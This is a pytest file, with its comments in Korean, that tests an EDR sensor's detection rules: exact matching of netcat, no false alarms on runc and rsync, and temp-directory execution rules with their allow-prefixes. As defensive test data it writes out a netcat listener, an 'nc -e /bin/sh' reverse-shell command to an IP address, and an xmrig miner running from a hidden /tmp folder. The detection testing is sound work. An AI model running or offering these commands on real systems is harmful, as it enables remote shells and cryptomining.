"""EDR IOA 규칙 — 바이너리 이름 매칭은 정확 일치여야 한다."""
from modules.edr import EDRSensor


class Sock:
    def emit(self, *a, **k): pass


def _sensor():
    return EDRSensor(Sock(), {"EDR_RESPONSE_MODE": "simulate"})


def test_runc_is_not_netcat():
    """라벨링 큐 실측 1위(108건): 'runc'(도커 런타임)가 endswith('nc') 로 netcat 에 걸렸다."""
    s = _sensor()
    for pr in ({"name": "runc", "cmdline": "runc --root /var/run/docker/runtime-runc/moby", "exe_path": "/usr/bin/runc"},
               {"name": "runc:[2:INIT]", "cmdline": "runc init", "exe_path": ""},
               {"name": "rsync", "cmdline": "rsync -a a b", "exe_path": "/usr/bin/rsync"}):
        risk, ioas = s._evaluate(pr)
        assert not any(i["rule"].startswith("IOA-BIN-nc") for i in ioas), pr["name"]


def test_real_netcat_forms_still_match():
    s = _sensor()
    for pr in ({"name": "nc", "cmdline": "nc -lvp 4444", "exe_path": "/usr/bin/nc"},
               {"name": "netcat-ish", "cmdline": "/usr/bin/nc -e /bin/sh 1.2.3.4 4444", "exe_path": ""},
               {"name": "x", "cmdline": "", "exe_path": "/opt/tools/nc"}):
        _, ioas = s._evaluate(pr)
        assert any(i["rule"] == "IOA-BIN-nc" for i in ioas), pr


def test_tmpexec_skips_pytest_sandbox_but_keeps_other_tmp():
    """실측 라벨링 오탐 118그룹의 근원 — pytest 임시 디렉터리 산출물. 예외는 그 접두만."""
    s = _sensor()
    ok = {"name": "fmt_target", "cmdline": "/tmp/pytest-of-mintkangaroo/pytest-59/test_x0/fmt_target", "exe_path": "/tmp/pytest-of-mintkangaroo/pytest-59/test_x0/fmt_target"}
    bad = {"name": "xmrig", "cmdline": "/tmp/.x/xmrig -o pool:4444", "exe_path": "/tmp/.x/xmrig"}
    assert not any(i["rule"] == "IOA-TMPEXEC" for i in s._evaluate(ok)[1])
    assert any(i["rule"] == "IOA-TMPEXEC" for i in s._evaluate(bad)[1])


def test_tmpexec_allow_prefix_must_live_under_temp_dirs():
    """'/' 나 '/usr' 같은 값으로 규칙을 통째로 끄는 실수를 막는다."""
    s = EDRSensor(Sock(), {"EDR_TMPEXEC_ALLOW_PREFIXES": "/, /usr, /tmp/ok-"})
    assert s.tmpexec_allow == ("/tmp/ok-",)
    assert any(i["rule"] == "IOA-TMPEXEC" for i in s._evaluate({"name": "x", "cmdline": "/tmp/evil", "exe_path": "/tmp/evil"})[1])
